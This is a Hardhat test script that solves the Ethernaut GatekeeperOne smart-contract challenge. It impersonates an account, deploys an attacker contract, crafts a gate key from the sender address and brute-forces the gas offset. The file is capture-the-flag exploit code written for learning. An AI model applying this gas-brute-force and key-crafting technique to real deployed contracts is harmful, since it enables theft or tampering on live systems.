import { expect } from "chai";
import hre, { ethers } from "hardhat";

describe("GateKeeperOne", function () {
  let gate: any;
  let attackerContract: any;
  let signer: any;
  const sonofmosiah = "0xBF7BF3d445aEc7B0c357163d5594DB8ca7C12D31";
  beforeEach(async () => {
    [signer] = await ethers.getSigners();

    await hre.network.provider.request({
      method: "hardhat_impersonateAccount",
      params: [sonofmosiah],
    });
    signer = await ethers.getSigner(sonofmosiah);
    const GateKeeperOne = await ethers.getContractFactory("GatekeeperOne");
    gate = GateKeeperOne.attach("0x56B66a8fBabA8709FD6D65b035A082257406EC9A");
    const GatekeeperAttacker = await ethers.getContractFactory(
      "GatekeeperAttacker"
    );
    attackerContract = await GatekeeperAttacker.connect(signer).deploy();
  });
  it("Should brute force the key", async function () {
    const gas = 80000;
    let i = 0;
    const txOrigin = ethers.utils.hexZeroPad(signer.address, 32);

    const part3 = ethers.utils.hexDataSlice(txOrigin, 30);
    const part1 = "0x00000001";
    const part2 = "0x0000";
    const key = ethers.utils.hexConcat([part1, part2, part3]);
    await attackerContract.checkGate3(key);
    for (i = 0; i < 8191; i++) {
      try {
        await attackerContract
          .connect(signer)
          .enter(gate.address, key, gas + i, {
            gasLimit: 120000,
          });

        break;
      } catch (error) {}
    }
    console.log(`${gas + i} success`);
  });
});
